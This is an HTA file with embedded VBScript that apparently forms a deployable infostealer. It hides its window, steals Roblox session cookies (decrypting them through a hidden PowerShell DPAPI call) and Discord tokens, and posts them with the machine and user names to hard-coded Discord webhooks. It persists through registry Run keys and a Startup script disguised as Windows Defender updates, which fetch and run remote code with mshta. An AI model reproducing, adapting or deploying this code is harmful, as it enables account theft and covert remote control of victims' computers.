<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="minimize"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, HAS_SENT
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' YOUR WEBHOOKS
WH_LOGS   = "https://discord.com/api/webhooks/1563118305412386856/q_NFutmLx_3SYcRz5V6kpLs4NszFU0DXON4t484Kizg1JnhVdW60LGYntgxmt04n-uyA"
WH_REGRAB = "https://discord.com/api/webhooks/1563118424929079298/E6jRzcYYY-UUycAzCamv5EqTNcBmWUjpmja39U_-BlHW8ExxU-ylIGpl4sIEWZiDl_M5"
WH_ONLINE = "https://discord.com/api/webhooks/1563118517958746183/MkkFXgq5RRDWp-EL7h42SsAxYkpp00l63QdCCznJYfSEhj05m4qN4-Arjrc_TBXBvjYc"

PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    
    ' Check if this is the first run
    Dim marker: marker = sh.ExpandEnvironmentStrings("%TEMP%") & "\.vanta_marker"
    If Not fso.FileExists(marker) Then
        ' FIRST TIME EXECUTION
        fso.CreateTextFile(marker, True).Close
        Call Persist
        Call InitialGrab
    Else
        ' REBOOT EXECUTION
        Call OnlineNotify
    End If
    
    ' Loop every 2.5 mins (150,000 ms)
    window.setInterval "GrabToRegrab()", 150000
End Sub

Sub OnlineNotify()
    Dim j: j = "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
    Call Post(WH_ONLINE, j)
End Sub

Sub InitialGrab()
    Dim rb, dc, j
    rb = GetRoblox()
    dc = GetDiscord()
    
    ' Send Name/IP
    j = "{""embeds"":[{""title"":""Initial Log"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
    Call Post(WH_LOGS, j)
    
    If rb <> "" Then
        j = "{""embeds"":[{""title"":""Roblox Cookie"",""description"":""\`\`\`text\n" & Ej(rb) & "\n\`\`\`"",""color"":65280}]}"
        Call Post(WH_LOGS, j)
    End If
    
    If dc <> "" Then
        j = "{""embeds"":[{""title"":""Discord Token"",""description"":""\`\`\`text\n" & Ej(dc) & "\n\`\`\`"",""color"":65280}]}"
        Call Post(WH_LOGS, j)
    End If
End Sub

Sub GrabToRegrab()
    Dim rb, j
    rb = GetRoblox()
    If rb <> "" Then
        j = "{""embeds"":[{""title"":""Regrab Cookie"",""description"":""Client: " & Ej(PC & " / " & USER) & "\n\`\`\`text\n" & Ej(rb) & "\n\`\`\`"",""color"":65280}]}"
        Call Post(WH_REGRAB, j)
    End If
End Sub

Sub Persist()
    ' CHANGE THIS TO dicerigs.app WHEN YOU POINT THE DOMAIN
    Dim payload: payload = "mshta https://dicerigs.onrender.com/check"
    
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"

    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
    Dim sf: Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://dicerigs.onrender.com/check"", 0, False"
    sf.Close
    Set sf = Nothing
End Sub

Sub Post(url, json)
    Dim h
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.setOption 2, 13056 ' Ignore SSL errors
    h.Open "POST", url, False
    h.setRequestHeader "Content-Type", "application/json"
    h.Send json
End Sub

Function GetRoblox()
    GetRoblox = ""
    Dim p(4), i, fp, raw, b64
    p(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    p(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    p(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    p(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    p(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    
    For i = 0 To 4
        If fso.FileExists(p(i)) Then fp = p(i): Exit For
    Next
    
    If Len(fp) = 0 Then Exit Function
    raw = ReadF(fp)
    
    If InStr(raw, "_|WARNING") > 0 Then
        GetRoblox = Mid(raw, InStr(raw, "_|WARNING"))
    ElseIf InStr(raw, "CookiesData"":""") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""") + 14
        Dim ep: ep = InStr(sp, raw, """")
        b64 = Mid(raw, sp, ep - sp)
        GetRoblox = Decrypt(b64)
    Else
        GetRoblox = raw
    End If
End Function

Function GetDiscord()
    GetDiscord = ""
    Dim dt, fld, f, txt, re, mt
    dt = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"
    If Not fso.FolderExists(dt) Then Exit Function
    
    txt = ""
    Set fld = fso.GetFolder(dt)
    For Each f In fld.Files
        If Right(LCase(f.Name), 4) = ".ldb" Or Right(LCase(f.Name), 4) = ".log" Then
            txt = txt & ReadF(f.Path)
        End If
    Next
    
    Set re = New RegExp
    re.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    re.Global = True
    Set mt = re.Execute(txt)
    If mt.Count > 0 Then GetDiscord = mt(0).Value
End Function

Function Decrypt(b64)
    Decrypt = ""
    Dim xml, node, bytes, cmd, exec
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = b64
    bytes = node.nodeTypedValue
    
    cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" & b64 & "'), $null, 'CurrentUser'))"""
    Set exec = sh.Exec(cmd)
    Decrypt = exec.StdOut.ReadAll
End Function

Function ReadF(path)
    ReadF = ""
    Dim f: Set f = fso.OpenTextFile(path, 1): ReadF = f.ReadAll: f.Close: Set f = Nothing
End Function

Function Ej(s)
    s = Replace(s, "\", "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n")
    Ej = s
End Function
</script>
</head><body></body></html>
